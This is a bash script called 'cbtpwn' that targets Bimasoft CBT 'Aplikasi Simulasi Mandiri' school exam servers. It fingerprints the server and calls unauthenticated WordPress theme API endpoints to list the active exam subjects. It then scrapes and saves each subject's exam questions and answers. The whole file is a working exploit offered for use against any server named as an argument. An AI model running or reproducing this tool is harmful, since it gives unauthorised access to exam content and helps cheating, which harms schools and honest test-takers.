#!/usr/bin/bash

# ------------------------------------------------------------------------------
#
#   Copyright vanillamilkk 2021
#   This program is licensed under GNU General Public License v3.0
#
#   Aplikasi Simulasi Mandiri Downloader (cbtpwn)
#   Tested on v12.2.7
#
# ------------------------------------------------------------------------------

# Welcome message
echo -ne "CBTPWN! Bimasoft CBT Aplikasi Simulasi Mandiri Downloader
 _______  _______  _______  _______  _     _  __    _ 
|       ||  _    ||       ||       || | _ | ||  |  | |
|       || |_|   ||_     _||    _  || || || ||   |_| |
|       ||       |  |   |  |   |_| ||       ||       |
|      _||  _   |   |   |  |    ___||       ||  _    |
|     |_ | |_|   |  |   |  |   |    |   _   || | |   |
|_______||_______|  |___|  |___|    |__| |__||_|  |__|


Copyright vanillamilkk 2021
This program is licensed under GNU General Public License v3.0
-----------------------------------------------------------------"

# Check if argument is passed
if [ $# -eq 0 ]
  then
    echo -e "\nInvalid argument!"
    echo -e "Usage : ./cbtpwn <server>"
    echo -e "Example : ./cbtpwn test.co.id"
    exit 1
fi

# Check if server is valid 
if [[  $(echo $@ | grep -P '(?=^.{5,254}$)(^(?:(?!\d+\.)[a-zA-Z0-9_\-]{1,63}\.?)+(?:[a-zA-Z]{2,})$)') ]]
    then
      echo -ne "\nServer: $@"
    else
      echo -e "\nInvalid server, make sure it's correct!"
      exit 1
fi

# Check if Aplikasi Simulasi Mandiri is supported
echo -ne "\nChecking server version..."
if [[ $(curl -s "https://$@/" | grep "Aplikasi Simulasi Mandiri") ]]
    then
      echo -ne "\nServer is valid, continue"
    else
      echo -e "\nInvalid server, not an Bimasoft v12 instances"
      exit 1
fi

# This URL return current active subject on the server
# Checking between two method
#
# Method 1 : /wp-content/themes/unbk/api-18575621/showhasil.php
# Method 2 : /wp-content/themes/unbk/api-18575621/showtest.php
#
echo -ne "\n\nConnecting to $@, trying both method..."
if [[ $(curl -s "https://$@/wp-content/themes/unbk/api-18575621/showhasil.php") ]] 
    then
      echo -ne "\nConnected to server (Using method 1)"
      server="https://$@/wp-content/themes/unbk/api-18575621/showhasil.php"
      elif [[ $(curl -s "https://$@/wp-content/themes/unbk/api-18575621/showtest.php") ]]
        then
          echo -ne "\nConnected to server (Using method 2)"
          server="https://$@/wp-content/themes/unbk/api-18575621/showtest.php"
    else
      echo -e "\nFailed to connect to server, exitting"
      exit 1
fi

# Create a folder for the downloaded file
echo -ne "\n\nCreating $@ folder..."
if [[ -d "./$@" ]]
    then
      echo -ne "\n$@ already exist, ignoring"
    else
      mkdir ./$@
      echo -ne "\nFolder created"
fi

# Download current active subject to a variable and convert to array
echo -ne "\n\nFetching subject list..."
# Split the variable by vertical bar to array because the server return : Subject1|Subject2|etc
IFS="\|" read -a pelajaran <<< "$(curl -s $server)"
# Calculate array size
jumlahpelajaran=${#pelajaran[@]}
echo -ne "\nFound $jumlahpelajaran subject(s)\n"

# loop through all subject and download it
for (( i=0; i<${jumlahpelajaran}; i++ ));
    do
      echo -ne "\nDownloading ${pelajaran[$i]}... ($(($i + 1))/$jumlahpelajaran) -"
      # Set url to download the exam per subject
      # /archives/soalujian---
      # Also using sed to escape spaces for url
      url="https://$@/archives/soalujian---$(echo -ne ${pelajaran[$i]} | sed -e 's/ /%20/g')"
      # Set tag variable to remove unnecessary html out of the exam page
      tag='<table style="border-collapse:collapse" border="0">'
      # Check if file already exist
      if [[ -f "./$@/${pelajaran[$i]}.html" ]]
        then
          echo -ne " FILE EXIST!"
        else
          # Download the exam page and cut only the question and answer
          soal=$(curl -s "$url" | sed -n "/$tag/,/<\/table>/p")
          # Check if soal is empty, then write to file
          if [ -z "$soal" ]
            then
              echo -ne " FILE IS EMPTY!"
            else
              echo "$soal" > "./$@/${pelajaran[$i]}.html"
              echo -ne " DONE!"
          fi
      fi
done

# Thankyou message
echo -e "\n\nAll files downloaded. Thank you!"
exit 1
